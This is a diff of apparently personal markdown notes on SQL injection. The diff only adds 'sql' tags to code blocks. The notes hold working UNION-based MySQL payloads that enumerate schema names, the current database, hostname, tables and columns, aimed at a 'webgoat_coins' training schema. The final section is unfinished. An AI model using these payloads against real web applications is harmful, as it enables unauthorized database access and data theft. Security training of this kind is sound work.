@@ -63,7 +63,7 @@ Get Number of Columns First (Required for further attacks)
 
 Retrieve All Database Names
 ---------------------------
-```
+```sql
 'UNION+ALL+SELECT+NULL,NULL,concat(schema_name)+FROM+information_schema.schemata#
 ```
 
@@ -71,7 +71,7 @@ Retrieve All Database Names
 
 Get Current Database Name and Additional Information
 ----------------------------------------------------
-```
+```sql
 '+UNION+ALL+SELECT+database(),NULL,NULL#
 @@datadir
 @@hostname
@@ -91,7 +91,7 @@ version()
 
 Get Tables in Database
 ----------------------
-```
+```sql
 # Table has 3 columns as identified above for this reason there are two "NULL" required. 
 '+UNION+ALL+SELECT+NULL,NULL,concat(TABLE_NAME)+FROM+information_schema.TABLES+WHERE+table_schema='webgoat_coins'#
 ```
@@ -99,7 +99,7 @@ Get Tables in Database
 
 Get Columns When Table Name is Known
 ------------------------------------
-```
+```sql
 # Table has 3 columns as identified above for this reason there are two "NULL" required. 
 '+UNION+ALL+SELECT+NULL,NULL,CONCAT(column_name,'+',column_type)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='products'+AND+table_schema='webgoat_coins'#
 ```
@@ -107,7 +107,7 @@ Get Columns When Table Name is Known
 
 Get Data from Columns MORE NOTES NEEDED 
 ---------------------
-```
+```sql
 ADD CONCAT technique!!!!!!!!!!!!!!!!!!!
 INJECTION MUST RESPECT THE NUMBER OF COLUMNS. USE NULL IF REQUIRED.
 
